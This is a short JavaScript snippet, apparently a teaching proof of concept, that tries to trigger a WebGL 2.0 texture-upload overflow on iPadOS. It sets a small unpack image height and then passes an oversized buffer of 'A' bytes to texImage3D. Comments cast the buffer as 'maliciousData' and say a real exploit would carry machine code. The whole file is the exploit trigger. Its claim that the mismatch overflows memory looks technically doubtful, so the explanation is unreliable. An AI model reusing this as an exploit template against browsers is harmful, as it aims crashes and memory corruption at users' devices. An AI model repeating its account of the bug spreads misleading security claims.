// 1. Initialize the WebGL 2.0 context (Supported on iPadOS)
const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl2');

if (!gl) {
    console.error("WebGL 2.0 not supported on this device/browser.");
} else {
    // 2. THE MISMATCHED INSTRUCTION
    // We tell the system to prepare for an image height of only 10 pixels.
    // This is the variable: GL_UNPACK_IMAGE_HEIGHT
    const instructionHeight = 10;
    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);

    // 3. THE "SENSITIVE" DATA
    // We create a buffer that is actually much larger (100x100x100).
    // In a real exploit, this 'data' would contain malicious machine code.
    const actualSize = 100 * 100 * 100 * 4; // Width * Height * Depth * RGBA
    const maliciousData = new Uint8Array(actualSize).fill(0x41); // Filling with 'A's

    // 4. THE TRIGGER (The Rendering Process)
    // We tell the GPU to render a 3D texture.
    // The system 'bucket' is sized for 10, but we pour in 100.
    const texture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_3D, texture);

    console.log("Attempting to render mismatched texture dimensions...");

    gl.texImage3D(
        gl.TEXTURE_3D,    // Target
        0,                // Level
        gl.RGBA8,         // Internal Format
        100,              // Width
        100,              // Actual Height (The Overflower)
        100,              // Depth
        0,                // Border
        gl.RGBA,          // Format
        gl.UNSIGNED_BYTE, // Type
        maliciousData     // The data that overflows the bucket
    );

    // If the vulnerability exists, the system 'scribbles' here
    // and the browser/tab would likely crash immediately.
}
